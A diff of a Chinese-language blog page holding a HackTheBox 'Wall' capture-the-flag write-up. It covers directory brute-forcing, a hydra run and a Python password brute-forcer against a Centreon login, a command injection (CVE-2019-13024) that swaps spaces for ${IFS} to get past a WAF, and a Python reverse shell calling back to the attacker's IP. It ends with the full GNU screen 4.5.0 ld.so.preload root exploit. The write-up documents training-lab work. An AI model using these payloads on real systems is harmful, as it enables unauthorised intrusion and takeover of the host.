@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html>
-  <head>
+<!DOCTYPE html><html><head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   
   
   <title>  HTB Wall Writeup |   Ikonw </title>
@@ -24,7 +22,7 @@
   <nav class="inner">
     <div class="title">
       <a href="/">
-        <img class="logo" src="/images/logo.png" />
+        <img class="logo" src="/images/logo.png">
       </a>
     </div>
 
@@ -124,63 +122,63 @@
 <h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><img src="/images/old-machine-images/20200113103328564.png" alt="a"></p>
 <h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/old-machine-images/20200113141911717.png" alt="a"><br>正常的nmap端口扫描 没有太多信息。 22 SSH 和端口 80 web 服务</p>
 <h2 id="二，网页目录爆破"><a href="#二，网页目录爆破" class="headerlink" title="二，网页目录爆破"></a>二，网页目录爆破</h2><p>我比较喜欢用gobuster，来进行目录爆破。如果没有 请自行安装</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install gobuster</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install gobuster</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>
 
-<p>我常用的字典是用 <strong>directory-list-2.3-medium.txt</strong><br>找到目录 <strong>&#x2F;monitoring</strong></p>
+<p>我常用的字典是用 <strong>directory-list-2.3-medium.txt</strong><br>找到目录 <strong>/monitoring</strong></p>
 <p><img src="/images/old-machine-images/2020011314234543.png" alt="a"><br>发现有个HTTP基础认证(HTTP Basic Authentication)<br><img src="/images/old-machine-images/20200113142511558.png" alt="a"></p>
 <h2 id="三，对基础认证进行试验"><a href="#三，对基础认证进行试验" class="headerlink" title="三，对基础认证进行试验"></a>三，对基础认证进行试验</h2><p>由于gobuster 没有扫到什么其他目录，于是我把目标放在这基础认证。 首先我尝试是否可以hydra 来进行爆破密码。</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -l admin -P Most-Popular-Letter-Passes.txt <span class="number">10.10.10.157</span> http-get /monitoring -t <span class="number">30</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -l admin -P Most-Popular-Letter-Passes.txt <span class="number">10.10.10.157</span> http-get /monitoring -t <span class="number">30</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>如何使用hydra 我就不仔细教学了，这里有一篇很好的文章讲解各种hydra 选项<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ECJTUACM-873284962/p/7805116.html">传送门</a></p>
-<p><img src="/images/old-machine-images/20200113142947843.png" alt="a"><br>hydra跑完后 我还是没有拿到密码。于是我把 <strong>http-get</strong> 换成 <strong>http-post</strong> 尝试</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -l admin -P Most-Popular-Letter-Passes.txt <span class="number">10.10.10.157</span> http-post /monitoring -t <span class="number">30</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113142947843.png" class="lazyload"><br>hydra跑完后 我还是没有拿到密码。于是我把 <strong>http-get</strong> 换成 <strong>http-post</strong> 尝试</p>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -l admin -P Most-Popular-Letter-Passes.txt <span class="number">10.10.10.157</span> http-post /monitoring -t <span class="number">30</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p>有意思的是居然每一个密码都能通过。<br><img src="/images/old-machine-images/20200113143116714.png" alt="a"><br>现在我们可以尝试使用burp suite更改请求。从GET换去POST。然后我们被跳转到 <strong>&#x2F;centreon</strong></p>
-<p><img src="/images/old-machine-images/20200113160329860.png" alt="a"><br>这里简单的抓包下看 登陆的过程。 有ANTI-CSRF TOKEN所以没办法爆破。我们从登陆页面发现<strong>centreon</strong> 版本为 <strong>v.19.04.0</strong></p>
-<p><img src="/images/old-machine-images/20200113161232966.png" alt="a"><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47069">edb链接</a></p>
+<p>有意思的是居然每一个密码都能通过。<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113143116714.png" class="lazyload"><br>现在我们可以尝试使用burp suite更改请求。从GET换去POST。然后我们被跳转到 <strong>/centreon</strong></p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113160329860.png" class="lazyload"><br>这里简单的抓包下看 登陆的过程。 有ANTI-CSRF TOKEN所以没办法爆破。我们从登陆页面发现<strong>centreon</strong> 版本为 <strong>v.19.04.0</strong></p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113161232966.png" class="lazyload"><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47069">edb链接</a></p>
 <h2 id="四，修改Exploit"><a href="#四，修改Exploit" class="headerlink" title="四，修改Exploit"></a>四，修改Exploit</h2><p>先来聊聊这个exploit 的 python文件都干了什么。<br>这个exploit 有两个部分，一个是<strong>登陆</strong> 一个是利用了<strong>命令注入</strong></p>
-<p>登陆的部分利用beautiful soup来抓去页面的 token。<br>然后利用提供的API进行登陆。<br>那么有意思的地方就在这里<br>我们是不是可以稍微修改下 让这部分变成密码爆破。<br><img src="/images/old-machine-images/20200113161853332.png" alt="a"><br>这里默认帐号是 <strong>admin</strong> 密码字典为 <strong>rockyou.txt</strong></p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import warnings</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">with <span class="built_in">open</span>(<span class="string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) as dict:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> dict:</span><br><span class="line">        request = requests<span class="selector-class">.session</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Retrieving CSRF token to submit the login form&quot;</span>)</span><br><span class="line">        page = request<span class="selector-class">.get</span>(<span class="string">&quot;http://10.10.10.157/centreon&quot;</span>+<span class="string">&quot;/index.php&quot;</span>)</span><br><span class="line">        html_content = page<span class="selector-class">.text</span></span><br><span class="line">        soup = <span class="built_in">BeautifulSoup</span>(html_content)</span><br><span class="line">        token = soup<span class="selector-class">.findAll</span>(<span class="string">&#x27;input&#x27;</span>)<span class="selector-attr">[3]</span><span class="selector-class">.get</span>(<span class="string">&quot;value&quot;</span>)</span><br><span class="line">        login_info = &#123;</span><br><span class="line">                <span class="string">&quot;useralias&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: password<span class="selector-class">.strip</span>(),</span><br><span class="line">                <span class="string">&quot;submitLogin&quot;</span>: <span class="string">&quot;Connect&quot;</span>,</span><br><span class="line">                <span class="string">&quot;centreon_token&quot;</span>: token</span><br><span class="line">                &#125;</span><br><span class="line">        login_request = request<span class="selector-class">.post</span>(<span class="string">&quot;http://10.10.10.157/centreon&quot;</span>+<span class="string">&quot;/index.php&quot;</span>, login_info)</span><br><span class="line">        <span class="built_in">print</span>(login_info)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your credentials are incorrect.&quot;</span> not <span class="keyword">in</span> login_request<span class="selector-class">.text</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Crackedddddddddddddddddd password = &#123;0&#125;&quot;</span><span class="selector-class">.format</span>(password<span class="selector-class">.strip</span>()))</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425</span></span><br></pre></td></tr></table></figure>
+<p>登陆的部分利用beautiful soup来抓去页面的 token。<br>然后利用提供的API进行登陆。<br>那么有意思的地方就在这里<br>我们是不是可以稍微修改下 让这部分变成密码爆破。<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113161853332.png" class="lazyload"><br>这里默认帐号是 <strong>admin</strong> 密码字典为 <strong>rockyou.txt</strong></p>
+<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import warnings</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">with <span class="built_in">open</span>(<span class="string">"/usr/share/wordlists/rockyou.txt"</span>,<span class="string">"r"</span>) as dict:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> dict:</span><br><span class="line">        request = requests<span class="selector-class">.session</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] Retrieving CSRF token to submit the login form"</span>)</span><br><span class="line">        page = request<span class="selector-class">.get</span>(<span class="string">"http://10.10.10.157/centreon"</span>+<span class="string">"/index.php"</span>)</span><br><span class="line">        html_content = page<span class="selector-class">.text</span></span><br><span class="line">        soup = <span class="built_in">BeautifulSoup</span>(html_content)</span><br><span class="line">        token = soup<span class="selector-class">.findAll</span>(<span class="string">'input'</span>)<span class="selector-attr">[3]</span><span class="selector-class">.get</span>(<span class="string">"value"</span>)</span><br><span class="line">        login_info = {</span><br><span class="line">                <span class="string">"useralias"</span>: <span class="string">"admin"</span>,</span><br><span class="line">                <span class="string">"password"</span>: password<span class="selector-class">.strip</span>(),</span><br><span class="line">                <span class="string">"submitLogin"</span>: <span class="string">"Connect"</span>,</span><br><span class="line">                <span class="string">"centreon_token"</span>: token</span><br><span class="line">                }</span><br><span class="line">        login_request = request<span class="selector-class">.post</span>(<span class="string">"http://10.10.10.157/centreon"</span>+<span class="string">"/index.php"</span>, login_info)</span><br><span class="line">        <span class="built_in">print</span>(login_info)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Your credentials are incorrect."</span> not <span class="keyword">in</span> login_request<span class="selector-class">.text</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[+] Crackedddddddddddddddddd password = {0}"</span><span class="selector-class">.format</span>(password<span class="selector-class">.strip</span>()))</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>执行后大约过了十几秒 我们成功取得密码（这密码也太弱了）<br><strong>admin:password1</strong></p>
-<p><img src="/images/old-machine-images/20200113162428647.png" alt="a"></p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113162428647.png" class="lazyload"></p>
 <h2 id="五，绕过WAF"><a href="#五，绕过WAF" class="headerlink" title="五，绕过WAF"></a>五，绕过WAF</h2><p>现在我们有了密码和帐号，我可以来实验看看原版的POC能不能让我们直接取得Shell。</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> <span class="number">47069</span>.py http://<span class="number">10.10.10.157</span>/centreon admin password1 <span class="number">10.10.14.22</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -nvlp <span class="number">443</span></span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> <span class="number">47069</span>.py http://<span class="number">10.10.10.157</span>/centreon admin password1 <span class="number">10.10.14.22</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -nvlp <span class="number">443</span></span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/old-machine-images/20200113162741683.png" alt="a"><br>一点动静都没有！没事 让我们仔细读读第二个部分的命令注入 我们可以手动注入命令！</p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113162741683.png" class="lazyload"><br>一点动静都没有！没事 让我们仔细读读第二个部分的命令注入 我们可以手动注入命令！</p>
 <p>从exploit 上可以得知 <strong>nagios_bin</strong> 这选项可以让我们直接执行远程命令</p>
 <p>想更了解这个Exploit形成的可以看作者的帖子</p>
-<p><a target="_blank" rel="noopener" href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">传送门</a><br><img src="/images/old-machine-images/20200113162949567.png" alt="a"><br>访问URL后并且用burp suite抓包 然后 <strong>ctrl+r</strong> 发去repeater<br>手动进行更换 一般遇上可以远程执行命令的问题时<br>可以尝试用ping wget curl 来判断是否可以远程执行。<br>因为这些命令都会与本地进行交互 并且可以查询到记录。</p>
-<p><img src="/images/old-machine-images/20200113163833292.png" alt="a"></p>
-<p>首先 先测试能不能ping<br>nagios_bin&#x3D;ping+10.10.14.12(自己KALI的IP)<br>然后在本地上开启tcpdump来监听ICMP<br>用 -i 来选择监听的interface</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">i</span> tun0 icmp</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">传送门</a><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113162949567.png" class="lazyload"><br>访问URL后并且用burp suite抓包 然后 <strong>ctrl+r</strong> 发去repeater<br>手动进行更换 一般遇上可以远程执行命令的问题时<br>可以尝试用ping wget curl 来判断是否可以远程执行。<br>因为这些命令都会与本地进行交互 并且可以查询到记录。</p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113163833292.png" class="lazyload"></p>
+<p>首先 先测试能不能ping<br>nagios_bin=ping+10.10.14.12(自己KALI的IP)<br>然后在本地上开启tcpdump来监听ICMP<br>用 -i 来选择监听的interface</p>
+<figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">i</span> tun0 icmp</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/old-machine-images/20200113164236597.png" alt="a"><br>搭建好环境后 选择send，结果却是forbidden 403。无法访问，这里就是“墙” 出现的地方了。</p>
-<p><img src="/images/old-machine-images/20200113164327348.png" alt="a"><br>这时候我们可以手动到页面进行测试，从a~z 然后各种符号。<br>最终发现任何字母都没问题，除了 空格会触发 403 forbidden。<br>我们可以用 <strong>${IFS}</strong> 来代替空格。</p>
-<p><img src="/images/old-machine-images/20200113165157271.png" alt="a"><br>结果tcpdump 还是没有任何结果。没关系，为了更进一步实验 我们可以尝试 wget。<br>打开一个web 服务（可以使用service apache2 start 或者 python3 -m http.server 80）</p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113164236597.png" class="lazyload"><br>搭建好环境后 选择send，结果却是forbidden 403。无法访问，这里就是“墙” 出现的地方了。</p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113164327348.png" class="lazyload"><br>这时候我们可以手动到页面进行测试，从a~z 然后各种符号。<br>最终发现任何字母都没问题，除了 空格会触发 403 forbidden。<br>我们可以用 <strong>${IFS}</strong> 来代替空格。</p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113165157271.png" class="lazyload"><br>结果tcpdump 还是没有任何结果。没关系，为了更进一步实验 我们可以尝试 wget。<br>打开一个web 服务（可以使用service apache2 start 或者 python3 -m http.server 80）</p>
 <p><strong>“nagios_bin”: “wget${IFS}10.10.14.12”</strong></p>
-<p>我们成功从发现了 log 里面返回了 wall 向本地抓去index.php<br>证实了 命令注入可以<br><img src="/images/old-machine-images/20200113165336273.png" alt="a"><br>经过一番折腾， 上传了各种php,bash shell。只有python shell可以使用<br>上传后，利用python 执行 python shell文件。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">s=socket<span class="selector-class">.socket</span>(socket<span class="selector-class">.AF_INET</span>,socket.SOCK_STREAM)</span><br><span class="line">s<span class="selector-class">.connect</span>((<span class="string">&quot;10.10.14.12&quot;</span>,<span class="number">443</span>)) <span class="comment">//替换这里成你的ip和端口</span></span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">0</span>)</span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">1</span>)</span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">2</span>)</span><br><span class="line">import pty</span><br><span class="line">pty<span class="selector-class">.spawn</span>(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure>
+<p>我们成功从发现了 log 里面返回了 wall 向本地抓去index.php<br>证实了 命令注入可以<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113165336273.png" class="lazyload"><br>经过一番折腾， 上传了各种php,bash shell。只有python shell可以使用<br>上传后，利用python 执行 python shell文件。</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">s=socket<span class="selector-class">.socket</span>(socket<span class="selector-class">.AF_INET</span>,socket.SOCK_STREAM)</span><br><span class="line">s<span class="selector-class">.connect</span>((<span class="string">"10.10.14.12"</span>,<span class="number">443</span>)) <span class="comment">//替换这里成你的ip和端口</span></span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">0</span>)</span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">1</span>)</span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">2</span>)</span><br><span class="line">import pty</span><br><span class="line">pty<span class="selector-class">.spawn</span>(<span class="string">"/bin/bash"</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/old-machine-images/20200113165830186.png" alt="a"></p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113165830186.png" class="lazyload"></p>
 <h2 id="六，提权"><a href="#六，提权" class="headerlink" title="六，提权"></a>六，提权</h2><p>提权相对容易发现。<br>首先查看 SUID文件。<br>发现可疑的 <strong>screen-4.5.0</strong></p>
-<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight arcade"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/old-machine-images/20200113170008960.png" alt="a"><br>谷歌一下 发现了提权漏洞</p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113170008960.png" class="lazyload"><br>谷歌一下 发现了提权漏洞</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41154">传送门</a></p>
 <p>个人习惯看到这种需要编译的漏洞都喜欢在本地编译好了再传输过去。直接执行这文件会出现未知错误。保险起见 我们手动把操作</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!/n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;/x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void){</span></span><br><span class="line"><span class="string">    chown("/tmp/rootshell", 0, 0);</span></span><br><span class="line"><span class="string">    chmod("/tmp/rootshell", 04755);</span></span><br><span class="line"><span class="string">    unlink("/etc/ld.so.preload");</span></span><br><span class="line"><span class="string">    printf("[+] done!/n");</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void){</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp("/bin/sh", NULL, NULL);</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"/x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536</span><br></pre></td></tr></tbody></table></figure>
 
-<p>手动操作好后 会出现两个文件<br><img src="/images/old-machine-images/20200113170701936.png" alt="a"></p>
-<p>利用wget 传输到 &#x2F;tmp<br>然后</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;/x0a/tmp/libhax.so&quot;</span></span><br><span class="line">然后执行 /tmp/rootshell</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+<p>手动操作好后 会出现两个文件<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113170701936.png" class="lazyload"></p>
+<p>利用wget 传输到 /tmp<br>然后</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"/x0a/tmp/libhax.so"</span></span><br><span class="line">然后执行 /tmp/rootshell</span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/old-machine-images/20200113171057750.png" alt="a"></p>
-<br/>
-<br/>
-<br/>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200113171057750.png" class="lazyload"></p>
+<br>
+<br>
+<br>
 
-<p><img src="/images/root.gif" alt="root"></p>
+<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
   	
 					
 	  </div>     
@@ -209,25 +207,31 @@
         <li class="iconfont 
 		icon-share-weixin 
 		-mob-share-weixin 
-		item"
-		></li>		
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weibo 
+		-mob-share-weibo 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-facebook 
+		-mob-share-facebook 
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-twitter 
 		-mob-share-twitter 
-		item"
-		></li>		
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-google 
 		-mob-share-google 
-		item"
-		></li>		
+		item"></li>		
    	   
 </ul>	
 
-<script id="-mob-share" 
-src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
       
     </div>
   </div>
@@ -270,7 +274,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 
     <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 
-    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+    <script src="//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js"></script>
 
     <script>
         new Valine({
@@ -296,10 +300,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
   
     <div class="none" id="search">
     <div class="header">
-        <input type="text" 
-        placeholder="Typing Something here." 
-        id="search-input" 
-        class="input" />
+        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
         
         <i id="search-cancel" class="iconfont icon-cancel"></i>
     </div>
@@ -309,7 +310,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
      <div class="mobile-menu">      
 
       
-      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
       
 
          
@@ -356,14 +357,14 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 <footer class="footer">
 	<div class="inner">
 		<div class="copyright">
-			&copy;
+			©
 			
-			2019 -
+			2020 -
 			
 			2023
 			Ikonw
 
-			<br/>
+			<br>
 			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
 		</div>
 	</div>
@@ -372,5 +373,5 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
     
 <script src="/nayo.bundle.js"></script>
            
-  </body>        
-</html>
+          
+</body></html>
